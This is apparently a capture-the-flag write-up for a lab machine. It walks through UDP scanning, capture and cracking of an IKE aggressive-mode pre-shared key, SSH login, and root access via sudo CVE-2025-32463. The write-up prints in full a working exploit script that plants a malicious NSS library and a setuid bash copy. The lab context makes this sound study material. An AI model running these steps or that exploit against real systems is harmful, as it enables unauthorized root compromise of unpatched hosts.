### Summary
We start this box without much from an `nmap` `TCP` scan, leading us to perform a `UDP` scan to discover an `IKE` (Internet Key Exchange) port 500 open, indicating an IPsec VPN server. We perform an aggressive `ike-scan` on the server to see poor security configurations. We dump the `PSK` and crack it to find a potential user and password combo that gives us ssh access to the box. We then execute `linpeas` to find a vulnerable version of sudo (CVE-2025-32463) which gives us seamless local privilege escalation to a root shell!

### Tools
- `ike-scan` - discover and fingerprint IKE hosts (IPsec VPN servers)
- `psk-crack` - crack IKE aggressive mode pre-shared keys
- `linpeas`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#IKE - UDP 500]]
###### [[#User Shell - ike]]
- [[#SSH - TCP 22]]
- [[#Enumeration]]
###### [[#Root Shell]]
- [[#CVE-2025-32463]]
	- [[#poc.sh]]

# Recon
## Initial Scan
---
```sh
> sudo nmap -p- --min-rate 10000 -vv 10.129.44.30 -oN nmap/tcp
# Nmap 7.92 scan initiated Tue Dec 23 01:05:18 2025 as: nmap -p- --min-rate 10000 -vv -oN nmap/tcp 10.129.44.30
Nmap scan report for 10.129.44.30
Host is up, received reset ttl 63 (0.030s latency).
Scanned at 2025-12-23 01:05:18 EST for 7s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Dec 23 01:05:25 2025 -- 1 IP address (1 host up) scanned in 7.18 seconds

> sudo nmap -p 22 -sCV -vv 10.129.44.30 -oN nmap/tcp-scripts
# Nmap 7.92 scan initiated Tue Dec 23 01:12:16 2025 as: nmap -p 22 -vv -sCV -oN nmap/tcp-scripts 10.129.44.30
Nmap scan report for 10.129.44.30
Host is up, received reset ttl 63 (0.029s latency).
Scanned at 2025-12-23 01:12:17 EST for 1s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 23 01:12:18 2025 -- 1 IP address (1 host up) scanned in 1.36 seconds
```
- With only `ssh` on port 22, this doesn't give us much to work with, other than the fact that this is a linux box given the TTL and the Debian `OpenSSH` server
- We'll scan again but for `UDP` this time

```sh
> sudo nmap -p- -sU --min-rate 10000 -vv 10.129.44.30 -oN nmap/udp
# Nmap 7.92 scan initiated Tue Dec 23 01:08:59 2025 as: nmap -p- -sU -vv --min-rate 10000 -oN nmap/udp 10.129.44.30
Warning: 10.129.44.30 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.44.30
Host is up, received echo-reply ttl 63 (0.034s latency).
Scanned at 2025-12-23 01:08:59 EST for 73s
Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT    STATE SERVICE REASON
500/udp open  isakmp  udp-response ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Dec 23 01:10:12 2025 -- 1 IP address (1 host up) scanned in 72.86 seconds

> sudo nmap -p 500 -sU -sCV -vv 10.129.44.30 -oN nmap/udp-scripts
# Nmap 7.92 scan initiated Tue Dec 23 01:11:28 2025 as: nmap -p 500 -sU -vv -sCV -oN nmap/udp-scripts 10.129.44.30
Nmap scan report for 10.129.44.30
Host is up, received echo-reply ttl 63 (0.028s latency).
Scanned at 2025-12-23 01:11:28 EST for 118s

PORT    STATE SERVICE REASON              VERSION
500/udp open  isakmp? udp-response ttl 63
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 23 01:13:26 2025 -- 1 IP address (1 host up) scanned in 118.27 seconds
```
- Looks like this is an `IKE` (Internet Key Exchange) IPsec VPN server

## IKE - UDP 500
---
- We can scan the `IKE` server on our host using the `ike-scan` tool:
```sh
❯ sudo ike-scan 10.129.44.30 
Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.44.30    Main Mode Handshake returned HDR=(CKY-R=0edfc2f15202f83d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.4: 1 hosts scanned in 1.295 seconds (0.77 hosts/sec).  1 returned handshake; 0 returned notify
```
- Looks like the encryption method is `3DES` with hash mode `SHA1`, insecure looking :D

- We can swap to a more aggressive scan type to capture more information:
```sh
❯ sudo ike-scan -A 10.129.44.30
Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.44.30    Aggressive Mode Handshake returned HDR=(CKY-R=56e5939e7553fe50) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.4: 1 hosts scanned in 0.043 seconds (23.02 hosts/sec).  1 returned handshake; 0 returned notify
```
- We now see that we've captured the user id, `ike@expressway.htb`

- We can capture the PSK (Pre-Shared Key) with the following:
```sh
❯ sudo ike-scan -A -P 10.129.44.30 | tee psk
Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.44.30    Aggressive Mode Handshake returned HDR=(CKY-R=d49d6fc5544dfb9a) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
ce4eb07809a1326d30e81970b4bcaccaf0a105ae44ef80dc9093cf77c45e2d8c9ffc2a6149e353673cd0bc81e4806c3e83091e48c551b3fd6a88bc358ed72b501760311859b4584693b1d480a6f061074b98d8c8c38da82b23cc32eaf2e05956f9d37937f6353a6b2e2fcee00a8ef4cf9ad106116e7e5f560894b2152938d966:2f17f2388347e80b8b58eb2fd96d800d7b3dbd4ce6daa32992afd089bec5fe3360193408b6daf1ce02d9994a96375792339d29bec932c4e546bea2cbd5b7f728b2d05889a8047174ca4224bb64934647c3c5b69ea73b401e0a7fb12baf8395786603f369a6af6ffa9d5552075f5835521219f44e3080eac50fc85258c4a68584:d49d6fc5544dfb9a:b858aba38ad4a907:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:4fe91ef7ce26dfca202b7f7ed86894f22d658731:ebd4e7db41793efb8aadd6cf950431439abac321b77f65479b62246eb8658a5e:4dd6245693ad880111132860611d837da7303ddb
Ending ike-scan 1.9.4: 1 hosts scanned in 0.044 seconds (22.77 hosts/sec).  1 returned handshake; 0 returned notify
```

- We can pass this to `psk-crack` to try and snatch the password:
```sh
❯ psk-crack psk -d ~/ctf/TOOLS/wordlist/rockyou.txt
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 2fa0c1e0af73d4f7d4382cec7120fd9a061aa537
Ending psk-crack: 8045040 iterations in 9.564 seconds (841159.63 iterations/sec)
```
- Hell yeah, we've got a potential password for user `ike`!

# User Shell - ike
## SSH - TCP 22
---
- We can try and use the password we just snatched to log into ssh as the user `ike`:
```sh
❯ ssh ike@10.129.44.30                 
ike@10.129.44.30\'s password: 
Last login: Tue Dec 23 06:28:07 GMT 2025 from 10.10.14.50 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Dec 23 06:57:05 2025 from 10.10.14.50
ike@expressway:~$ cat user.txt 
64d71e007423223ad56cadf76ec6edd9
```
- We love to see it

## Enumeration
---
- I did the typical `sudo -l` check for no passwd but we didn't get anything
- I used `ss -lptn` and saw that port `25` was also open and tried some mail server enumeration but it was a dead end
- I uploaded `linpeas` from a python webserver and ran it
- An easy blurb it spat out was that my version of `sudo` was `1.9.17` which is potentially susceptible to `chroot` privesc via CVE-2025-32463

# Root Shell
## CVE-2025-32463
---
- I grabbed a [poc off github](https://github.com/KaiHT-Ladiant/CVE-2025-32463) and copied the script contents and executed it on the box and just like that, we got a root shell!
- But let's first take a peek at what this is actually doing and why it works:
### poc.sh
```sh
#!/bin/bash
# CVE-2025-32463 PoC - Sudo Chroot Privilege Escalation
# Based on research by Rich Mirch @ Stratascale Cyber Research Unit

STAGE=$(mktemp -d /tmp/pentest.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > kai_ht.c<<'CEOF'
#include <stdlib.h>
#include <unistd.h>

void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  system("id > /tmp/pwned_proof.txt");
  system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
  execl("/bin/bash", "/bin/bash", NULL);
}
CEOF

mkdir -p pentest/etc libnss_
echo "passwd: /kai_ht" > pentest/etc/nsswitch.conf
cp /etc/group pentest/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/kai_ht.so.2 kai_ht.c

echo "[*] Exploiting CVE-2025-32463..."
echo "[*] Attempting privilege escalation..."
sudo -R pentest pentest

# Cleanup
rm -rf ${STAGE?}
```
- It looks like we're creating and jumping to a temp directory
- Then we create a C program that sets our effective user and group IDs to root, changes to the root directory, and makes a suid copy of bash and executes it
- We then copy some specifically named files and compile our C program
- More information [here](https://threatninja.net/abusing-sudos-chroot-cve-2025-32463-explained/)
- From the github repo:

The vulnerability occurs due to a **timing issue in sudo's security validation process**. The `pivot_root` function is executed **before security policy verification**, allowing attackers to manipulate the file system environment that sudo uses for authentication and authorization.

1. **Environment Manipulation**: Attacker creates a controlled chroot environment with malicious `nsswitch.conf`
2. **Library Injection**: Malicious NSS (Name Service Switch) library is placed in the controlled environment
3. **Privilege Escalation**: sudo loads and executes the malicious library with root privileges
4. **Root Access**: Attacker gains full root shell access

- The exploit works without a hitch, and we get a root shell:
```sh
root@expressway:/root# cat root.txt 
15b143be19a1d70469946d33f5f95b63
```
